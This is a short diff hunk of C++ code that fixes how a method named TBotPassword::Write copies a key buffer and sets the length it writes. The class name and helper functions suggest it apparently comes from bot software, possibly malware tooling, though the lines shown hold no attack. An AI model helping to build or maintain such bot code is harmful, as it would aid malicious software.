@@ -969,13 +969,13 @@ bool __fastcall TBotPassword::Write(PCHAR Buf, DWORD BufSize)
 			throw Exception(Error_BigPassword);
 
         m_memset(Key.c_str(), 0, FRealSize);
-		m_memcpy(Key.c_str(), Str, Size + 1);
+		m_memcpy(Key.c_str(), Str, Size);
 
 		if (Encrypted)
 			Decrypt(Key.c_str(), Key.c_str());
     }
 
-    DoWrite(Buf, BufSize, Key.c_str(), FRealSize);
+    DoWrite(Buf, BufSize, Key.c_str(), Key.Length());
 }
 
 
